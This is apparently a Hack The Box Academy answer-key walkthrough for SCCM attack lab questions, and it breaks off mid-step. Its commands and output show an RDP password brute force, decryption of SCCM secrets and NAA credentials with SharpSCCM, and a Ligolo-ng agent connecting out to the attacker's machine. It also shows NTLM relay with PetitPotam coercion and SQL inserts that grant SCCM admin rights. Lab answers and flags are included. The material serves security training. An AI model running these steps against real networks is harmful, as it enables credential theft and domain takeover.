└──╼ [★]$ cat << EOF > passwords.txt
Password123!
Pxetesting01
Welcome01$
EOF
```

After spawning the target, students will perform a password brute force against the user `Rai` using the previously created password list with `NetExec`:

Code: shell

```shell
netexec rdp STMIP -u rai -p passwords.txt
```

```
┌─[us-academy-6]─[10.10.14.84]─[htb-ac-8414@htb-e45gbp5lqc]─[~]
└──╼ [★]$ netexec rdp 10.129.58.104 -u rai -p passwords.txt

RDP         10.129.58.104   3389   SRV01            [*] Windows 10 or Windows Server 2016 Build 17763 (name:SRV01) (domain:lab.local) (nla:True)
RDP         10.129.58.104   3389   SRV01            [-] lab.local\rai:Password123! (STATUS_LOGON_FAILURE)
RDP         10.129.58.104   3389   SRV01            [+] lab.local\rai:{hidden} (Pwn3d!)
```

Answer: `Pxetesting01`

# Abusing SCCM

## Question 2

### "What credentials were found in the task sequence?"

Students will open a new terminal tab and establish an RDP session with the target using `xfreerdp`:

Code: shell

```shell
xfreerdp /v:STMIP /u:blwasp /p:'Password123!' /dynamic-resolution /drive:.,academy
```

```
┌─[us-academy-6]─[10.10.14.84]─[htb-ac-8414@htb-sr5x5iu2xb]─[~]
└──╼ [★]$ xfreerdp /v:10.129.122.22 /u:blwasp /p:'Password123!' /dynamic-resolution /drive:.,academy

[00:21:38:660] [105239:105240] [WARN][com.freerdp.crypto] - Certificate verification failure 'self-signed certificate (18)' at stack position 0
[00:21:38:660] [105239:105240] [WARN][com.freerdp.crypto] - CN = SRV01.lab.local
[00:21:38:661] [105239:105240] [ERROR][com.freerdp.crypto] - @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
[00:21:38:661] [105239:105240] [ERROR][com.freerdp.crypto] - @           WARNING: CERTIFICATE NAME MISMATCH!           @
[00:21:38:661] [105239:105240] [ERROR][com.freerdp.crypto] - @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
[00:21:38:661] [105239:105240] [ERROR][com.freerdp.crypto] - The hostname used for this connection (10.129.122.22:3389) 
[00:21:38:661] [105239:105240] [ERROR][com.freerdp.crypto] - does not match the name given in the certificate:
[00:21:38:661] [105239:105240] [ERROR][com.freerdp.crypto] - Common Name (CN):
[00:21:38:661] [105239:105240] [ERROR][com.freerdp.crypto] - 	SRV01.lab.local
[00:21:38:661] [105239:105240] [ERROR][com.freerdp.crypto] - A valid certificate for the wrong name should NOT be trusted!
Certificate details for 10.129.122.22:3389 (RDP-Server):
	Common Name: SRV01.lab.local
	Subject:     CN = SRV01.lab.local
	Issuer:      CN = SRV01.lab.local
	Thumbprint:  52:ab:92:ff:f6:13:4f:72:15:9e:22:69:8e:8a:4a:16:57:80:2c:93:bd:c7:72:2f:8d:bf:c7:bf:7e:9b:c0:ae
The above X.509 certificate could not be verified, possibly because you do not have
the CA certificate in your certificate store, or the certificate has expired.
Please look at the OpenSSL documentation on how to add a private CA to the store.
Do you trust the above certificate? (Y/T/N) Y
```

Subsequently, they will open `PowerShell` as Administrator, and navigate to `C:\Tools`:

Code: powershell

```powershell
cd C:\Tools
```

```
Windows PowerShell
Copyright (C) Microsoft Corporation. All rights reserved.

PS C:\Windows\system32> cd C:\Tools\
```

Students will run `SharpSCCM.exe` using `get` command group with `secrets` to query the machine policy and acquire information about the secrets and task sequence.

Code: powershell

```powershell
.\SharpSCCM.exe get secrets
```

```
PS C:\Tools> .\SharpSCCM.exe get secrets

  _______ _     _ _______  ______  _____  _______ _______ _______ _______
  |______ |_____| |_____| |_____/ |_____] |______ |       |       |  |  |
  ______| |     | |     | |    \_ |       ______| |______ |______ |  |  |    @_Mayyhem

[+] Querying the local WMI repository for the current management point and site code
[+] Connecting to \\127.0.0.1\root\CCM
[+] Current management point: SCCM01.lab.local
[+] Site code: HTB
<SNIP>
[+] Received encoded response from server for policy HTB20008-HTB00005-6F6BCC28
[+] Successfully decoded and decrypted secret policy
[+] Decrypted secrets:

TS_Sequence: <sequence version="3.10"><step type="SMS_TaskSequence_RunCommandLineAction" name="Run Command Line" description="" runIn="WinPEandFullOS" successCodeList="0 3010" retryCount="0" runFromNet="false"><action>smsswd.exe /run: powershell -c "$pass = ConvertTo-SecureString "{hidden}" -AsPlainText -Force; $cred = New-Object System.Management.Automation.PSCredential("LAB\sccm_admin", $pass); <SNIP>
```

Answer: `adm1n5ccM!`

# Abusing SCCM

## Question 3

### "What's the complete value of the collection variable An\_interesting\_variable?"

Students will scrutinize the output of `SharpSCCM.exe` from the previous question and will look for the value in the `Value:` variable:

```
PS C:\Tools> .\SharpSCCM.exe get secrets

  _______ _     _ _______  ______  _____  _______ _______ _______ _______
  |______ |_____| |_____| |_____/ |_____] |______ |       |       |  |  |
  ______| |     | |     | |    \_ |       ______| |______ |______ |  |  |    @_Mayyhem

[+] Querying the local WMI repository for the current management point and site code
[+] Connecting to \\127.0.0.1\root\CCM
[+] Current management point: SCCM01.lab.local
[+] Site code: HTB

<SNIP>

[+] Received encoded response from server for policy {SMSDM003}
[+] Successfully decoded and decrypted secret policy
[+] Decrypted secrets:

Value: {hidden}
Propery 'PolicyPrecedence': 1 (Type: 19)
Propery 'Name': An_interesting_variable (Type: 8)

<SNIP>
```

Answer: `If needed : pusH_4ccoun7!`

# Abusing SCCM

## Question 4

### "Connect to the shared folder \\\\LAB-DC\\SCCMShare\\NNA using the NNA account and read the content of the flag.txt."

Students will scrutinize the output of `SharpSCCM.exe` from the second question, and will stumble upon the credentials of `sccm_naa`:

```
PS C:\Tools> .\SharpSCCM.exe get secrets

  _______ _     _ _______  ______  _____  _______ _______ _______ _______
  |______ |_____| |_____| |_____/ |_____] |______ |       |       |  |  |
  ______| |     | |     | |    \_ |       ______| |______ |______ |  |  |    @_Mayyhem

[+] Querying the local WMI repository for the current management point and site code
[+] Connecting to \\127.0.0.1\root\CCM
[+] Current management point: SCCM01.lab.local
[+] Site code: HTB

<SNIP>

[+] Received encoded response from server for policy {ee824457-706f-4dd0-b8d2-edf5df5a3a55}
[+] Successfully decoded and decrypted secret policy
[+] Decrypted secrets:

NetworkAccessUsername: LAB\sccm_naa
NetworkAccessPassword: Password123!
NetworkAccessUsername: LAB\sccm_naa
NetworkAccessPassword: Password123!

<SNIP>
```

Subsequently, students are going to use the obtained credentials and will utilize `runas` to spawn a `PowerShell` session in the context of the `sccm_naa` using the password \`Password123!:

Code: powershell

```powershell
runas /netonly /user:LAB\sccm_naa powershell
```

```
PS C:\Tools> runas /netonly /user:LAB\sccm_naa powershell
Enter the password for LAB\sccm_naa:
Attempting to start powershell as user "LAB\sccm_naa" ...
```

In the newly spawned `PowerShell` session, students will grab the flag located in `\\LAB-DC\SCCMShare\NNA`:

Code: powershell

```powershell
type \\LAB-DC\SCCMShare\NNA\flag.txt
```

```
Windows PowerShell
Copyright (C) Microsoft Corporation. All rights reserved.

PS C:\Windows\system32> type \\LAB-DC\SCCMShare\NNA\flag.txt
```

Answer: `NNA_4cc0unt!`

# SCCM Site Takeover I

## Question 1

### "What's the CreatedDate value of the sccm\_admin account?"

After spawning the target, students will proceed to establish an RDP session using the credentials `blwasp:Password123!`:

Code: shell

```shell
xfreerdp /v:STMIP /u:blwasp /p:'Password123!' /dynamic-resolution /drive:.,academy
```

```
┌─[eu-academy-6]─[10.10.14.68]─[htb-ac-8414@htb-gn1fpdjbhs]─[~]
└──╼ [★]$ xfreerdp /v:10.129.35.2 /u:blwasp /p:'Password123!' /dynamic-resolution /drive:.,academy

[03:29:43:976] [22774:22775] [INFO][com.freerdp.crypto] - creating directory /home/htb-ac-8414/.config/freerdp
[03:29:43:977] [22774:22775] [INFO][com.freerdp.crypto] - creating directory [/home/htb-ac-8414/.config/freerdp/certs]
[03:29:43:977] [22774:22775] [INFO][com.freerdp.crypto] - created directory [/home/htb-ac-8414/.config/freerdp/server]
[03:29:43:045] [22774:22775] [WARN][com.freerdp.crypto] - Certificate verification failure 'self-signed certificate (18)' at stack position 0
[03:29:43:045] [22774:22775] [WARN][com.freerdp.crypto] - CN = SRV01.lab.local
[03:29:43:046] [22774:22775] [ERROR][com.freerdp.crypto] - @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
[03:29:43:046] [22774:22775] [ERROR][com.freerdp.crypto] - @           WARNING: CERTIFICATE NAME MISMATCH!           @
[03:29:43:046] [22774:22775] [ERROR][com.freerdp.crypto] - @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
[03:29:43:046] [22774:22775] [ERROR][com.freerdp.crypto] - The hostname used for this connection (10.129.35.2:3389) 
[03:29:43:046] [22774:22775] [ERROR][com.freerdp.crypto] - does not match the name given in the certificate:
[03:29:43:046] [22774:22775] [ERROR][com.freerdp.crypto] - Common Name (CN):
[03:29:43:046] [22774:22775] [ERROR][com.freerdp.crypto] - 	SRV01.lab.local
[03:29:43:046] [22774:22775] [ERROR][com.freerdp.crypto] - A valid certificate for the wrong name should NOT be trusted!
Certificate details for 10.129.35.2:3389 (RDP-Server):
	Common Name: SRV01.lab.local
	Subject:     CN = SRV01.lab.local
	Issuer:      CN = SRV01.lab.local
	Thumbprint:  52:ab:92:ff:f6:13:4f:72:15:9e:22:69:8e:8a:4a:16:57:80:2c:93:bd:c7:72:2f:8d:bf:c7:bf:7e:9b:c0:ae
The above X.509 certificate could not be verified, possibly because you do not have
the CA certificate in your certificate store, or the certificate has expired.
Please look at the OpenSSL documentation on how to add a private CA to the store.
Do you trust the above certificate? (Y/T/N) Y
```

Right after establishing the RDP session, students will return to their workstations and are going to download a Windows Ligolo-ng agent and a Linux Ligolo-ng proxy:

Code: shell

```shell
wget -q https://github.com/nicocha30/ligolo-ng/releases/download/v0.6.2/ligolo-ng_agent_0.6.2_windows_amd64.zip
wget -q https://github.com/nicocha30/ligolo-ng/releases/download/v0.6.2/ligolo-ng_proxy_0.6.2_linux_amd64.tar.gz
unzip ligolo-ng_agent_0.6.2_windows_amd64.zip
tar xvf ligolo-ng_proxy_0.6.2_linux_amd64.tar.gz
chmod +x proxy
```

```
┌─[eu-academy-6]─[10.10.14.68]─[htb-ac-8414@htb-abfaqfhkbl]─[~]
└──╼ [★]$ wget -q https://github.com/nicocha30/ligolo-ng/releases/download/v0.6.2/ligolo-ng_agent_0.6.2_windows_amd64.zip
wget -q https://github.com/nicocha30/ligolo-ng/releases/download/v0.6.2/ligolo-ng_proxy_0.6.2_linux_amd64.tar.gz
unzip ligolo-ng_agent_0.6.2_windows_amd64.zip
tar xvf ligolo-ng_proxy_0.6.2_linux_amd64.tar.gz
chmod +x proxy

Archive:  ligolo-ng_agent_0.6.2_windows_amd64.zip
  inflating: LICENSE                 
  inflating: README.md               
  inflating: agent.exe               
LICENSE
README.md
proxy
```

Subsequently, students will start the `proxy` using `sudo` and wait for a connection from the agent:

Code: shell

```shell
sudo ./proxy -selfcert
```

```
┌─[eu-academy-6]─[10.10.14.68]─[htb-ac-8414@htb-gn1fpdjbhs]─[~]
└──╼ [★]$ sudo ./proxy -selfcert

WARN[0000] Using default selfcert domain 'ligolo', beware of CTI, SOC and IoC! 
WARN[0000] Using self-signed certificates               
ERRO[0000] Certificate cache error: acme/autocert: certificate cache miss, returning a new certificate 
WARN[0000] TLS Certificate fingerprint for ligolo is: 3D1C5764D3CF381A39789ABAE7A3CABED7036952888F9996A8B37CD328E84827 
INFO[0000] Listening on 0.0.0.0:11601                   
    __    _             __                       
   / /   (_)___ _____  / /___        ____  ____ _
  / /   / / __ \`/ __ \/ / __ \______/ __ \/ __ \`/
 / /___/ / /_/ / /_/ / / /_/ /_____/ / / / /_/ / 
/_____/_/\__, /\____/_/\____/     /_/ /_/\__, /  
        /____/                          /____/   

  Made in France ♥            by @Nicocha30!
  Version: 0.6.2

ligolo-ng »
```

Right after starting the proxy, students will return to the RDP session, open `PowerShell`, will transfer the `agent.exe` executable file, and will establish a connection back to the proxy:

Code: powershell

```powershell
cp \\TSCLIENT\academy\agent.exe
.\agent.exe -connect PWNIP:11601 -ignore-cert
```

```
Windows PowerShell
Copyright (C) Microsoft Corporation. All rights reserved.

PS C:\Users\blwasp> cp \\TSCLIENT\academy\agent.exe
PS C:\Users\blwasp> .\agent.exe -connect 10.10.14.68:11601 -ignore-cert
time="2024-08-27T10:34:19+02:00" level=warning msg="warning, certificate validation disabled"
time="2024-08-27T10:34:19+02:00" level=info msg="Connection established" addr="10.10.14.68:11601"
```

Students will return to their workstations and the tab of the proxy, and will proceed to create and start a tunnel:

Code: shell

```shell
session
1
interface_create --name ligolo
tunnel_start --tun ligolo
```

```
INFO[0096] Agent joined.                                 name="LAB\\blwasp@SRV01" remote="10.129.35.2:49761"
ligolo-ng » session
? Specify a session : 1 - #1 - LAB\blwasp@SRV01 - 10.129.35.2:49761
[Agent : LAB\blwasp@SRV01] » interface_create --name ligolo
INFO[0170] Creating a new "ligolo" interface...         
INFO[0170] Interface created!                           
[Agent : LAB\blwasp@SRV01] » tunnel_start --tun ligolo
[Agent : LAB\blwasp@SRV01] » INFO[0176] Starting tunnel to LAB\blwasp@SRV01 
```

They will open a new terminal tab, and will specify the route for the traffic:

Code: shell

```shell
sudo ip route add 172.50.0.0/24 dev ligolo
```

```
┌─[eu-academy-6]─[10.10.14.68]─[htb-ac-8414@htb-gn1fpdjbhs]─[~]
└──╼ [★]$ sudo ip route add 172.50.0.0/24 dev ligolo
```

Students are going to clone the impacket, initiate a Python virtual environment, and install the requirements:

Code: shell

```shell
git clone -q https://github.com/fortra/impacket
cd impacket 
python3 -m venv .impacket
source .impacket/bin/activate
python3 -m pip install .
```

```
┌─[eu-academy-6]─[10.10.14.68]─[htb-ac-8414@htb-gn1fpdjbhs]─[~]
└──╼ [★]$ git clone -q https://github.com/fortra/impacket
cd impacket 
python3 -m venv .impacket
source .impacket/bin/activate
python3 -m pip install .

Processing /home/htb-ac-8414/impacket
  Preparing metadata (setup.py) ... done
Collecting charset_normalizer
<SNIP>
```

Subsequently, students will utilize `ntlmrelayx.py` to relay the coerced authentication and establish a SOCKS connection to the `172.50.0.30` host via the `MSSQL` protocol:

Code: shell

```shell
python3 examples/ntlmrelayx.py -t "mssql://172.50.0.30" -smb2support -socks --no-http-server
```

```
(.impacket) ┌─[eu-academy-6]─[10.10.14.68]─[htb-ac-8414@htb-gn1fpdjbhs]─[~/impacket]
└──╼ [★]$ python3 examples/ntlmrelayx.py -t "mssql://172.50.0.30" -smb2support -socks --no-http-server

Impacket v0.12.0.dev1+20240826.122401.27c196f8 - Copyright 2023 Fortra

<SNIP>

[*] Setting up SMB Server on port 445
[*] Setting up WCF Server on port 9389
[*] Setting up RAW Server on port 6666
[*] Multirelay disabled

[*] Servers started, waiting for connections
Type help for list of commands
ntlmrelayx>
```

They will open a new terminal tab, download `PetitPotam.py`, and use the script using the `blwasp:Password123!` credentials to coerce the `172.50.0.21` host to connect to the workstation:

Code: shell

```shell
wget -q https://raw.githubusercontent.com/topotam/PetitPotam/main/PetitPotam.py
python3 PetitPotam.py -u blwasp -p 'Password123!' -d 'lab.local' PWNIP 172.50.0.21
```

```
┌─[eu-academy-6]─[10.10.14.68]─[htb-ac-8414@htb-gn1fpdjbhs]─[~]
└──╼ [★]$ wget -q https://raw.githubusercontent.com/topotam/PetitPotam/main/PetitPotam.py

┌─[eu-academy-6]─[10.10.14.68]─[htb-ac-8414@htb-gn1fpdjbhs]─[~]
└──╼ [★]$ python3 PetitPotam.py -u BlWasp -p 'Password123!' -d 'lab.local' 10.10.14.68 172.50.0.21

<SNIP>

Trying pipe lsarpc
[-] Connecting to ncacn_np:172.50.0.21[\PIPE\lsarpc]
[+] Connected!
[+] Binding to c681d488-d850-11d0-8c52-00c04fd90f7e
[+] Successfully bound!
[-] Sending EfsRpcOpenFileRaw!
[-] Got RPC_ACCESS_DENIED!! EfsRpcOpenFileRaw is probably PATCHED!
[+] OK! Using unpatched function!
[-] Sending EfsRpcEncryptFileSrv!
[+] Got expected ERROR_BAD_NETPATH exception!!
[+] Attack worked!
```

Students will notice the successful authentication and SOCKS connection in `ntlmrelayx.py`:

```
<SNIP>
[*] SMBD-Thread-19 (process_request_thread): Received connection from 10.129.35.2, attacking target mssql://172.50.0.30
[*] Authenticating against mssql://172.50.0.30 as LAB/SCCM01$ SUCCEED
[*] SOCKS: Adding LAB/SCCM01$@172.50.0.30(1433) to active SOCKS connection. Enjoy
[*] All targets processed!
<SNIP>
```

Students will proceed to modify the `/etc/proxychains.conf` file by changing the port from `9050` to `1080`:

Code: shell

```shell
sudo sed -i 's/9050/1080/g' /etc/proxychains.conf
```

```
┌─[eu-academy-6]─[10.10.14.68]─[htb-ac-8414@htb-gn1fpdjbhs]─[~]
└──╼ [★]$ sudo sed -i 's/9050/1080/g' /etc/proxychains.conf
```

Subsequently, students will use `mssqclient.py` to connect as `LAB/SCCM01$` to the `172.50.0.30` host using `proxychains`:

Code: shell

```shell
sudo proxychains -q mssqlclient.py 'LAB/SCCM01$'@172.50.0.30 -windows-auth -no-pass
```

```
┌─[eu-academy-6]─[10.10.14.68]─[htb-ac-8414@htb-gn1fpdjbhs]─[~]
└──╼ [★]$ sudo proxychains -q mssqlclient.py 'LAB/SCCM01$'@172.50.0.30 -windows-auth -no-pass

Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation

[*] ENVCHANGE(DATABASE): Old Value: master, New Value: master
[*] ENVCHANGE(LANGUAGE): Old Value: , New Value: us_english
[*] ENVCHANGE(PACKETSIZE): Old Value: 4096, New Value: 16192
[*] INFO(SQL): Line 1: Changed database context to 'master'.
[*] INFO(SQL): Line 1: Changed language setting to us_english.
[*] ACK: Result: 1 - Microsoft SQL Server (160 3232) 
[!] Press help for extra shell commands
SQL> 
```

Students will use the `CM_HTB` database and are going to query the `LogonName` and `CreatedDate` columns of the `RBAC_Admins` table to acquire the date the account was created:

Code: sql

```sql
use CM_HTB;
SELECT LogonName,CreatedDate FROM RBAC_Admins WHERE LogonName = 'LAB\sccm_admin';
```

```
SQL> use CM_HTB;
[*] ENVCHANGE(DATABASE): Old Value: master, New Value: CM_HTB
[*] INFO(SQL): Line 1: Changed database context to 'CM_HTB'.
SQL> SELECT LogonName,CreatedDate FROM RBAC_Admins WHERE LogonName = 'LAB\sccm_admin';

LogonName           CreatedDate   
--------------------------------

LAB\sccm_admin      {hidden}
```

Answer: `2024-05-10 10:12:57`

# SCCM Site Takeover I

## Question 2

### "Convert Dario's SID to binary and submit the value as the answer:"

Students will locate and copy `PowerView.ps1` to their current working directories on their workstations:

Code: shell

```shell
locate PowerView.ps1
cp /usr/share/windows-resources/powersploit/Recon/PowerView.ps1 .
```

```
┌─[eu-academy-6]─[10.10.14.51]─[htb-ac-8414@htb-j8ulzwq2b7]─[~]
└──╼ [★]$ locate PowerView.ps1
/usr/share/windows-resources/powersploit/Recon/PowerView.ps1

┌─[eu-academy-6]─[10.10.14.51]─[htb-ac-8414@htb-j8ulzwq2b7]─[~]
└──╼ [★]$ cp /usr/share/windows-resources/powersploit/Recon/PowerView.ps1 .
```

Students will return to the RDP session established on the target, open `PowerShell`, and are going to transfer the `PowerView.ps1` file:

Code: powershell

```powershell
cp \\TSCLIENT\academy\PowerView.ps1 .
```

```
Windows PowerShell
Copyright (C) Microsoft Corporation. All rights reserved.

PS C:\Users\blwasp> cp \\TSCLIENT\academy\PowerView.ps1 .
```

Subsequently, students will import `PowerView.ps1` and will query the domain user `blwasp`, obtaining his `objectsid` value:

Code: powershell

```powershell
Import-Module .\PowerView.ps1
Get-DomainUser blwasp -Properties objectsid
```

```
PS C:\Users\blwasp> Import-Module .\PowerView.ps1
PS C:\Users\blwasp> Get-DomainUser dario -Properties objectsid

objectsid
---------
S-1-5-21-2570265163-3918697770-3667495639-1235
```

They will utilize the `convert-StringSidToBinary` function from the section and will convert the SID of `blwasp` to binary:

Code: powershell

```powershell
function Convert-StringSidToBinary {
 param (
 [Parameter(Mandatory=$true, Position=0)]
 [string]$StringSid
 )

 $sid = New-Object System.Security.Principal.SecurityIdentifier $StringSid
 $binarySid = New-Object byte[] ($sid.BinaryLength)
 $sid.GetBinaryForm($binarySid, 0)
        
 $binarySidHex = ($binarySid | ForEach-Object { $_.ToString("X2") }) -join ''
 echo "0x$($binarySidHex.ToLower())"
}
Convert-StringSidToBinary S-1-5-21-2570265163-3918697770-3667495639-1235
```

```
PS C:\Users\blwasp> function Convert-StringSidToBinary {
>>  param (
>>  [Parameter(Mandatory=$true, Position=0)]
>>  [string]$StringSid
>>  )
>>
>>  $sid = New-Object System.Security.Principal.SecurityIdentifier $StringSid
>>  $binarySid = New-Object byte[] ($sid.BinaryLength)
>>  $sid.GetBinaryForm($binarySid, 0)
>>
>>  $binarySidHex = ($binarySid | ForEach-Object { $_.ToString("X2") }) -join ''
>>  echo "0x$($binarySidHex.ToLower())"
>> }

PS C:\Users\blwasp> Convert-StringSidToBinary S-1-5-21-2570265163-3918697770-3667495639-1235

{hidden}
```

Answer: `0x0105000000000005150000004b2233992a9592e9d78a99dad3040000`

# SCCM Site Takeover I

## Question 3

### "Abuse the SQL access and promote Blwasp's account to the SCCM Administrator. Read the flag located at \\\\SCCM01\\NewShare\\blwasp.txt"

Students will reuse the previously established chain of connections from the first question. They will return to the RDP session and binary representation of `blwasp`'s SID:

Code: powershell

```powershell
Get-DomainUser blwasp -Properties objectsid
function Convert-StringSidToBinary {
 param (
 [Parameter(Mandatory=$true, Position=0)]
 [string]$StringSid
 )

 $sid = New-Object System.Security.Principal.SecurityIdentifier $StringSid
 $binarySid = New-Object byte[] ($sid.BinaryLength)
 $sid.GetBinaryForm($binarySid, 0)
        
 $binarySidHex = ($binarySid | ForEach-Object { $_.ToString("X2") }) -join ''
 echo "0x$($binarySidHex.ToLower())"
}
Convert-StringSidToBinary S-1-5-21-2570265163-3918697770-3667495639-1103
```

```
PS C:\Users\blwasp> Get-DomainUser blwasp -Properties objectsid

objectsid
---------
S-1-5-21-2570265163-3918697770-3667495639-1103

PS C:\Users\blwasp> function Convert-StringSidToBinary {
>>  param (
>>  [Parameter(Mandatory=$true, Position=0)]
>>  [string]$StringSid
>>  )
>>
>>  $sid = New-Object System.Security.Principal.SecurityIdentifier $StringSid
>>  $binarySid = New-Object byte[] ($sid.BinaryLength)
>>  $sid.GetBinaryForm($binarySid, 0)
>>
>>  $binarySidHex = ($binarySid | ForEach-Object { $_.ToString("X2") }) -join ''
>>  echo "0x$($binarySidHex.ToLower())"
>> }

PS C:\Users\blwasp> Convert-StringSidToBinary S-1-5-21-2570265163-3918697770-3667495639-1103

0x0105000000000005150000004b2233992a9592e9d78a99da4f040000
```

Students will reuse the previously established session within `mssqlclient.py` to add `blwasp` using his binary representation of the SID into the SCCM Administrators group and are going to confirm the addition while taking note of the `AdminID` value:

Code: sql

```sql
INSERT INTO RBAC_Admins (AdminSID,LogonName,IsGroup,IsDeleted,CreatedBy,CreatedDate,ModifiedBy,ModifiedDate,SourceSite) VALUES (0x0105000000000005150000004b2233992a9592e9d78a99da4f040000,'LAB\blwasp',0,0,'','','','','HTB');
SELECT AdminID,LogonName from RBAC_Admins WHERE LogonName = 'LAB\blwasp';
```

```
SQL> INSERT INTO RBAC_Admins (AdminSID,LogonName,IsGroup,IsDeleted,CreatedBy,CreatedDate,ModifiedBy,ModifiedDate,SourceSite) VALUES (0x0105000000000005150000004b2233992a9592e9d78a99da4f040000,'LAB\blwasp',0,0,'','','','','HTB');
SQL> SELECT AdminID,LogonName from RBAC_Admins WHERE LogonName = 'LAB\blwasp';

    AdminID   LogonName
-----------   ----------
   16777228   LAB\blwasp 
```

Subsequently, students will escalate the permission of `blwasp` using SQL queries with the respective `AdminID` value:

Code: sql

```sql
INSERT INTO RBAC_ExtendedPermissions (AdminID,RoleID,ScopeID,ScopeTypeID) VALUES (16777228,'SMS0001R','SMS00ALL','29');
INSERT INTO RBAC_ExtendedPermissions (AdminID,RoleID,ScopeID,ScopeTypeID) VALUES (16777228,'SMS0001R','SMS00001','1');
INSERT INTO RBAC_ExtendedPermissions (AdminID,RoleID,ScopeID,ScopeTypeID) VALUES (16777228,'SMS0001R','SMS00004','1');
```

```
SQL> INSERT INTO RBAC_ExtendedPermissions (AdminID,RoleID,ScopeID,ScopeTypeID) VALUES (16777228,'SMS0001R','SMS00ALL','29');
SQL> INSERT INTO RBAC_ExtendedPermissions (AdminID,RoleID,ScopeID,ScopeTypeID) VALUES (16777228,'SMS0001R','SMS00001','1');
SQL> INSERT INTO RBAC_ExtendedPermissions (AdminID,RoleID,ScopeID,ScopeTypeID) VALUES (16777228,'SMS0001R','SMS00004','1');
```

Students will sign out of the previously established RDP session and will reconnect:

Code: shell

```shell
xfreerdp /v:STMIP /u:blwasp /p:'Password123!' /dynamic-resolution /drive:.,academy
```

```
┌─[eu-academy-6]─[10.10.14.68]─[htb-ac-8414@htb-gn1fpdjbhs]─[~]
└──╼ [★]$ xfreerdp /v:10.129.35.2 /u:blwasp /p:'Password123!' /dynamic-resolution /drive:.,academy

[05:21:39:321] [195181:195182] [WARN][com.freerdp.crypto] - Certificate verification failure 'self-signed certificate (18)' at stack position 0
[05:21:39:321] [195181:195182] [WARN][com.freerdp.crypto] - CN = SRV01.lab.local
[05:21:40:425] [195181:195182] [ERROR][com.winpr.timezone] - Unable to find a match for unix timezone: US/Central
[05:21:41:626] [195181:195182] [INFO][com.freerdp.gdi] - Local framebuffer format  PIXEL_FORMAT_BGRX32
[05:21:41:626] [195181:195182] [INFO][com.freerdp.gdi] - Remote framebuffer format PIXEL_FORMAT_BGRA32
[05:21:41:644] [195181:195182] [INFO][com.freerdp.channels.rdpsnd.client] - [static] Loaded fake backend for rdpsnd
[05:21:41:644] [195181:195245] [INFO][com.freerdp.channels.rdpdr.client] - Loading device service drive [academy] (static)
[05:21:41:644] [195181:195182] [INFO][com.freerdp.channels.drdynvc.client] - Loading Dynamic Virtual Channel rdpgfx
[05:21:41:644] [195181:195182] [INFO][com.freerdp.channels.drdynvc.client] - Loading Dynamic Virtual Channel disp
[05:21:42:208] [195181:195182] [INFO][com.freerdp.client.x11] - Logon Error Info LOGON_WARNING [LOGON_MSG_SESSION_
```

Subsequently, students will open `PowerShell` and will grab the flag located in the `\\SCCM01\NewShare\` directory:

Code: powershell

```powershell
type \\SCCM01\NewShare\blwasp.txt
```

```
Windows PowerShell
Copyright (C) Microsoft Corporation. All rights reserved.

PS C:\Users\blwasp> type \\SCCM01\NewShare\blwasp.txt
```

Answer: `Abus1ng_MSSQL_To_Compromise_SCCM`

# SCCM Site Takeover II

## Question 1

### "Abuse NTLM Relay and promote Dario's account to the SCCM Administrator. Read the flag located at \\\\SCCM01\\NewShare\\dario.txt"

After spawning the target machine, students will establish an RDP session using the credentials `blwasp:Password123!`:

Code: shell

```shell
xfreerdp /v:STMIP /u:blwasp /p:'Password123!' /dynamic-resolution /drive:.,academy
```

```
┌─[eu-academy-6]─[10.10.14.51]─[htb-ac-8414@htb-hiptcwhhbe]─[~]
└──╼ [★]$ xfreerdp /v:10.129.230.38 /u:blwasp /p:'Password123!' /dynamic-resolution /drive:.,academy

[05:09:15:823] [19101:19102] [INFO][com.freerdp.crypto] - creating directory /home/htb-ac-8414/.config/freerdp
[05:09:15:823] [19101:19102] [INFO][com.freerdp.crypto] - creating directory [/home/htb-ac-8414/.config/freerdp/certs]
[05:09:15:823] [19101:19102] [INFO][com.freerdp.crypto] - created directory [/home/htb-ac-8414/.config/freerdp/server]
[05:09:15:872] [19101:19102] [WARN][com.freerdp.crypto] - Certificate verification failure 'self-signed certificate (18)' at stack position 0
[05:09:15:872] [19101:19102] [WARN][com.freerdp.crypto] - CN = SRV01.lab.local
[05:09:15:873] [19101:19102] [ERROR][com.freerdp.crypto] - @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
[05:09:15:873] [19101:19102] [ERROR][com.freerdp.crypto] - @           WARNING: CERTIFICATE NAME MISMATCH!           @
[05:09:15:873] [19101:19102] [ERROR][com.freerdp.crypto] - @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
[05:09:15:873] [19101:19102] [ERROR][com.freerdp.crypto] - The hostname used for this connection (10.129.230.38:3389) 
[05:09:15:873] [19101:19102] [ERROR][com.freerdp.crypto] - does not match the name given in the certificate:
[05:09:15:873] [19101:19102] [ERROR][com.freerdp.crypto] - Common Name (CN):
[05:09:15:873] [19101:19102] [ERROR][com.freerdp.crypto] - 	SRV01.lab.local
[05:09:15:873] [19101:19102] [ERROR][com.freerdp.crypto] - A valid certificate for the wrong name should NOT be trusted!
Certificate details for 10.129.230.38:3389 (RDP-Server):
	Common Name: SRV01.lab.local
	Subject:     CN = SRV01.lab.local
	Issuer:      CN = SRV01.lab.local
	Thumbprint:  52:ab:92:ff:f6:13:4f:72:15:9e:22:69:8e:8a:4a:16:57:80:2c:93:bd:c7:72:2f:8d:bf:c7:bf:7e:9b:c0:ae
The above X.509 certificate could not be verified, possibly because you do not have
the CA certificate in your certificate store, or the certificate has expired.
Please look at the OpenSSL documentation on how to add a private CA to the store.
Do you trust the above certificate? (Y/T/N) Y
```

Students will return to their workstations and will locate and copy `PowerView.ps1` to their current working directories on their workstations:

Code: shell

```shell
locate PowerView.ps1
cp /usr/share/windows-resources/powersploit/Recon/PowerView.ps1 .
```

```
┌─[eu-academy-6]─[10.10.14.51]─[htb-ac-8414@htb-j8ulzwq2b7]─[~]
└──╼ [★]$ locate PowerView.ps1
/usr/share/windows-resources/powersploit/Recon/PowerView.ps1

